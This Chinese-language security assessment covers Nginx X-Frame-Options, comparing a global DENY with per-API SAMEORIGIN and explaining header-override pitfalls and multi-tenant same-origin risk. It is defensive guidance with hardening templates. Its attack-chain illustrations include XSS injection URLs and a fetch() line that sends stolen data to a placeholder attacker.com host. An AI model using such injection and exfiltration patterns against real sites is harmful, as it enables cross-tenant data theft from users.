# Nginx X-Frame-Options 安全评估：全局 DENY 与 API 级 SAMEORIGIN 的权衡

## 1. 问题背景

作为 API 接入平台，你的当前配置策略是：

```nginx
# 主配置文件（全局默认）
add_header X-Frame-Options "DENY" always;
```

```nginx
# 特定 API 的 location 配置
add_header X-Frame-Options "SAMEORIGIN" always;
```

你希望评估这个做法是否存在安全隐患。

---

## 2. X-Frame-Options 三种值的含义与风险

| 值 | 含义 | 风险等级 |
|----|------|----------|
| `DENY` | 完全禁止任何来源的 iframe 嵌入 | 低（最安全） |
| `SAMEORIGIN` | 仅允许同源页面嵌入 iframe | 中（有一定风险） |
| `ALLOW-FROM uri` | 仅允许指定 URI 嵌入（浏览器支持差，已废弃） | 高（不推荐） |

### 2.1 SAMEORIGIN 的风险分析

**SAMEORIGIN 允许同源 iframe 嵌入意味着什么？**

如果攻击者能在你的同源域名下注入恶意 JavaScript（例如通过 XSS 漏洞），攻击流程如下：

```
1. 攻击者在 www.abc.com/search?q=<script>恶意代码</script> 注入 XSS
2. 用户访问该页面，恶意 JS 在用户浏览器执行
3. 恶意 JS 创建隐藏 iframe 嵌入需要 SAMEORIGIN 的 API 页面
4. 由于同源，恶意 JS 可以读取 iframe 内容（DOM、localStorage 等）
5. 敏感数据（API 响应、token 等）被盗走
```

**关键结论**：SAMEORIGIN 的安全性**依赖于同源没有任何 XSS 漏洞**。

---

## 3. Nginx add_header 覆盖机制的核心问题

### 3.1 覆盖而非继承

这是最容易被忽视的安全隐患。如果你在 API location 中定义：

```nginx
location /api/v1/embeddable {
    add_header X-Frame-Options "SAMEORIGIN" always;
    # ... 其他配置
}
```

**这个 add_header 会覆盖父级（server/http）的所有 add_header，不仅仅是 X-Frame-Options！**

这意味着以下安全头也会丢失：

| 丢失的安全头 | 安全影响 |
|-------------|---------|
| `X-Content-Type-Options: nosniff` | 浏览器可能 MIME sniff，导致 XSS 风险增加 |
| `Strict-Transport-Security` | 无法强制 HTTPS，增加中间人攻击风险 |
| `X-Frame-Options: DENY` | 点击劫持保护被降级为 SAMEORIGIN |

### 3.2 正确做法：重新包含所有安全头

如果必须在 API 级别覆盖 X-Frame-Options 为 SAMEORIGIN，必须**同时重新包含所有其他安全头**：

```nginx
# 安全头配置片段 /etc/nginx/snippets/security-headers-deny.conf
add_header X-Content-Type-Options nosniff always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Frame-Options DENY always;

# 安全头配置片段 /etc/nginx/snippets/security-headers-sameorigin.conf
add_header X-Content-Type-Options nosniff always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Frame-Options SAMEORIGIN always;
```

```nginx
# API 需要 SAMEORIGIN
location /api/v1/embeddable {
    include /etc/nginx/snippets/security-headers-sameorigin.conf;
    # 其他 API 特定配置
}
```

---

## 4. 安全评估矩阵

### 4.1 你的当前方案风险

| 风险点 | 严重程度 | 描述 |
|--------|----------|------|
| SAMEORIGIN 暴露同源 XSS 风险 | **高** | 如果同源存在任何 XSS，iframe 内容可被恶意 JS 读取 |
| 覆盖导致其他安全头丢失 | **高** | 如果不重新包含，X-Content-Type-Options 等关键头丢失 |
| 点击劫持攻击面扩大 | **中** | 攻击者可构造恶意页面嵌入你的 API 进行操作 |

### 4.2 场景分析

| 场景 | 推荐配置 | 原因 |
|------|----------|------|
| 内部 API，无 iframe 需求 | `DENY` | 最安全，无攻击面 |
| 需要让客户网站嵌入 iframe | `SAMEORIGIN` 或 CSP `frame-ancestors` | 如果客户网站与你同源才可用 SAMEORIGIN |
| 需要让特定外部站点嵌入 | **不推荐 X-Frame-Options** | 使用 CSP `frame-ancestors` 替代 |
| 纯后端 API（无页面渲染） | `DENY` | 无需考虑 iframe 场景 |

---

## 5. 推荐方案

### 5.1 方案 A：使用 CSP frame-ancestors 替代 X-Frame-Options（推荐）

Content-Security-Policy 的 `frame-ancestors` 指令是更现代、更灵活的方案：

```nginx
# CSP 替代方案
add_header Content-Security-Policy "frame-ancestors 'none';" always;
# 或允许特定域
add_header Content-Security-Policy "frame-ancestors https://trusted-customer.com;" always;
```

**优势**：
- `frame-ancestors 'none'` 等同于 `X-Frame-Options: DENY`
- `frame-ancestors 'self'` 等同于 `X-Frame-Options: SAMEORIGIN`
- 可以指定多个允许的源
- 更细粒度的控制

### 5.2 方案 B：仅对确需嵌入的 API 使用 SAMEORIGIN

如果确实需要支持 iframe 嵌入：

```nginx
# 默认全局 DENY
server {
    include /etc/nginx/snippets/security-headers-deny.conf;
}

# 需要嵌入的 API（单独 server 块或独立 location）
server {
    # 确需嵌入的 API 使用 SAMEORIGIN
    include /etc/nginx/snippets/security-headers-sameorigin.conf;
    
    location /api/v1/embeddable {
        # API 特定配置
    }
}
```

### 5.3 方案 C：使用 ALLOW-FROM（不推荐）

```nginx
# 仅当有明确的白名单 URL 时考虑
add_header X-Frame-Options "ALLOW-FROM https://trusted-customer.com" always;
```

**警告**：浏览器支持很差，Chrome 已完全不支持。

---

## 6. 安全检查清单

如果你决定使用 SAMEORIGIN，务必确保：

- [ ] **已重新包含所有安全头**（X-Content-Type-Options、HSTS 等）
- [ ] **同源无 XSS 漏洞**（定期进行代码扫描和安全测试）
- [ ] **评估 API 数据敏感性**（如果 API 返回敏感数据，不应允许 iframe）
- [ ] **考虑使用 CSP frame-ancestors** 替代 X-Frame-Options
- [ ] **记录允许 SAMEORIGIN 的 API 列表**，便于审计
- [ ] **客户/用户知情同意**（他们应该知道数据可能通过 iframe 被同源 JS 访问）

---

## 7. 配置文件模板

### 7.1 完整的 snippet 文件

```nginx
# /etc/nginx/snippets/security-headers-deny.conf
# 全局安全头（DENY）
add_header X-Content-Type-Options nosniff always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Frame-Options DENY always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# /etc/nginx/snippets/security-headers-sameorigin.conf
# API 嵌入场景安全头（SAMEORIGIN）
add_header X-Content-Type-Options nosniff always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Frame-Options SAMEORIGIN always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# /etc/nginx/snippets/security-headers-csp.conf
# CSP 方案（推荐）
add_header Content-Security-Policy "frame-ancestors 'none';" always;
add_header X-Content-Type-Options nosniff always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-XSS-Protection "1; mode=block" always;
```

### 7.2 使用示例

```nginx
# 主配置
server {
    listen 443 ssl;
    server_name www.abc.com;
    
    # 默认使用 DENY
    include /etc/nginx/snippets/security-headers-deny.conf;
    
    # 大部分 API 走默认
    location /api/v1/internal {
        proxy_pass http://backend;
    }
    
    # 需要嵌入的 API 使用 SAMEORIGIN
    location /api/v1/embeddable-customer {
        include /etc/nginx/snippets/security-headers-sameorigin.conf;
        proxy_pass http://backend;
    }
}
```

---

## 8. 测试验证

```bash
# 测试 DENY 配置的 API
curl -I https://www.abc.com/api/v1/internal

# 验证响应头
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# Strict-Transport-Security: max-age=...

# 测试 SAMEORIGIN 配置的 API
curl -I https://www.abc.com/api/v1/embeddable-customer

# 验证响应头
# X-Frame-Options: SAMEORIGIN
# X-Content-Type-Options: nosniff  # 确保没有丢失
# Strict-Transport-Security: max-age=...
```

---

## 9. 总结建议

| 建议 | 说明 |
|------|------|
| **优先使用 CSP frame-ancestors** | 更灵活，支持白名单 |
| **确需 SAMEORIGIN 时必须重新包含所有头** | 防止覆盖导致安全头丢失 |
| **评估 API 敏感数据** | 敏感数据不应通过 iframe 暴露 |
| **定期安全扫描同源 XSS** | SAMEORIGIN 安全性依赖无 XSS |
| **记录和审计** | 追踪哪些 API 使用了 SAMEORIGIN |

**最终建议**：如果 API 平台的大部分 API 不需要 iframe 嵌入功能，保持全局 `DENY` 是最安全的选择。仅为确有需要的少数 API 开启 `SAMEORIGIN`，并确保这些 API 返回的数据不包含高度敏感信息（如认证 token、个人隐私数据等）。

---

## 10. 多租户场景下的 SAMEORIGIN 安全评估（追加）

### 10.1 场景描述

你的架构是**同一域名下按 Location path 划分多个用户/租户**：

```
www.abc.com/tenant-a/api/...  → 用户 A 的 API
www.abc.com/tenant-b/api/...  → 用户 B 的 API
www.abc.com/tenant-c/api/...  → 用户 C 的 API
```

其中某些租户的 API 开启了 `SAMEORIGIN`（允许 iframe 嵌入），而其他租户可能是普通 API。

### 10.2 核心问题

**如果攻击者能在同域名任意路径注入 XSS，是否能攻击使用 SAMEORIGIN 的其他租户？**

**答案：是，攻击完全成立。**

### 10.3 攻击链分析

```
┌─────────────────────────────────────────────────────────────┐
│ 攻击场景：Tenant-A 的 API 开启了 SAMEORIGIN                   │
│           Tenant-B 被攻击者注入了 XSS                         │
└─────────────────────────────────────────────────────────────┘

攻击流程：

1. 攻击者通过 XSS 在 Tenant-B 的路径注入恶意 JS
   www.abc.com/tenant-b/user/profile?name=<script>恶意代码</script>

2. 受害者访问 Tenant-B 的页面，恶意 JS 在浏览器执行
   恶意 JS 与 www.abc.com 同源（因为是同一域名）

3. 恶意 JS 创建隐藏 iframe 嵌入 Tenant-A 的 SAMEORIGIN API
   <iframe src="www.abc.com/tenant-a/api/embeddable"></iframe>

4. 由于 iframe 页面与恶意 JS 同源，恶意 JS 可以：
   - 读取 iframe 的完整 DOM
   - 访问 iframe 的 localStorage/sessionStorage
   - 读取 iframe 内的 API 响应（包括敏感数据）

5. 恶意 JS 将窃取的敏感数据外带
   fetch('https://attacker.com/steal?data=' + stolenData)
```

### 10.4 同源策略的关键点

同源策略的"同源"定义是：**协议 + 域名 + 端口**，**与路径无关**。

```
www.abc.com/tenant-a/api    → origin = https://www.abc.com
www.abc.com/tenant-b/api    → origin = https://www.abc.com  （相同！）
www.abc.com/any/path        → origin = https://www.abc.com  （相同！）
```

因此：
- Tenant-B 的 XSS 与 Tenant-A 的 SAMEORIGIN API **是同源的**
- SAMEORIGIN 的保护在 XSS 面前**完全失效**

### 10.5 风险评估矩阵

| 风险因素 | 严重程度 | 说明 |
|---------|----------|------|
| 任意租户存在 XSS | **致命** | 可攻击所有使用 SAMEORIGIN 的租户 |
| 多租户共享域名 | **高** | 攻击面从单一路径扩大到所有租户路径 |
| SAMEORIGIN API 返回敏感数据 | **高** | 即使 XSS 在其他租户，也可窃取数据 |
| 攻击隐蔽性 | **高** | 恶意 JS 在受害者浏览器执行，难检测 |

### 10.6 更危险的攻击场景

如果攻击者控制了某个**使用 SAMEORIGIN 的租户**（例如 Tenant-A 本身被入侵）：

```
1. 攻击者直接在自己的租户页面植入恶意 JS
2. 恶意 JS 可以嵌入其他所有使用 SAMEORIGIN 的租户 API
3. 甚至可以嵌入设置了 DENY 的 API（因为 DENY 只阻止 iframe 嵌入，
   但恶意 JS 已经在同源内，可以直接调用 API 获取数据）
```

**关键结论**：当多租户共享同一域名时，SAMEORIGIN 的安全性**不仅依赖你自己的路径无 XSS，而是依赖所有租户的所有路径都无 XSS**。

### 10.7 多租户场景的安全建议

#### 10.7.1 如果必须使用 SAMEORIGIN

```nginx
# 为每个租户使用独立的子域名（隔离 origin）
tenant-a.api.abc.com
tenant-b.api.abc.com

# 这样 XSS 在 tenant-b.api.abc.com 无法嵌入 tenant-a.api.abc.com
# 因为是不同 origin
```

#### 10.7.2 考虑使用 CSP frame-ancestors 限制

```nginx
# 不允许任何 iframe 嵌入
add_header Content-Security-Policy "frame-ancestors 'none';" always;

# 或仅允许特定受控域名
add_header Content-Security-Policy "frame-ancestors https://trusted-portal.abc.com;" always;
```

#### 10.7.3 对敏感 API 使用 DENY

```nginx
# 即使是 embeddable API，如果返回敏感数据，仍使用 DENY
location /api/v1/sensitive-data {
    add_header X-Frame-Options DENY always;
    # 重新包含所有安全头
    add_header X-Content-Type-Options nosniff always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
}
```

#### 10.7.4 最小化 SAMEORIGIN API 的数量

```nginx
# 默认全局 DENY
server {
    include /etc/nginx/snippets/security-headers-deny.conf;
}

# 仅对极少数确需嵌入且数据不敏感的 API 使用 SAMEORIGIN
location /public/embeddable/dashboard {
    # 此 API 必须：
    # 1. 不返回敏感数据（无 auth token、无 PII）
    # 2. 所有租户路径都无 XSS 漏洞
    # 3. 用户明确知情同意嵌入风险
    include /etc/nginx/snippets/security-headers-sameorigin.conf;
}
```

### 10.8 多租户隔离的最佳实践

| 方案 | 隔离程度 | 成本 | 适用场景 |
|------|---------|------|---------|
| 独立子域名 | 完全隔离 | 中 | 多租户需要 SAMEORIGIN 时 |
| 统一 DENY | 最安全 | 低 | 大多数多租户 API 场景 |
| CSP frame-ancestors | 中等 | 中 | 需要细粒度控制嵌入来源 |
| 每租户独立证书/域名 | 完全隔离 | 高 | 高安全要求场景 |

### 10.9 审计清单（多租户场景）

- [ ] **识别所有使用 SAMEORIGIN 的 API 路径**
- [ ] **评估每个 SAMEORIGIN API 返回的数据敏感性**
- [ ] **检查所有租户路径的 XSS 防护措施**
- [ ] **考虑迁移到独立子域名隔离**
- [ ] **如果不能隔离，至少确保所有租户路径都有严格的输入验证**
- [ ] **定期进行全域名 XSS 扫描**
- [ ] **考虑使用 WAF 防护 XSS 攻击**

### 10.10 最终结论

**在多租户按路径划分且共享同一域名的情况下，使用 SAMEORIGIN 是一个高风险选择。**

核心原因：
1. **攻击面扩展**：任意租户的 XSS 都能攻击所有 SAMEORIGIN API
2. **木桶效应**：安全性取决于所有租户中最薄弱的那个
3. **数据泄露风险**：SAMEORIGIN API 返回的数据可能在不知情情况下被窃取

**推荐做法**：
- 尽量使用 `DENY`，避免 SAMEORIGIN
- 如需 SAMEORIGIN，优先考虑子域名隔离
- 定期审计所有租户路径的 XSS 漏洞
- 使用 CSP frame-ancestors 替代 X-Frame-Options 以获得更细粒度控制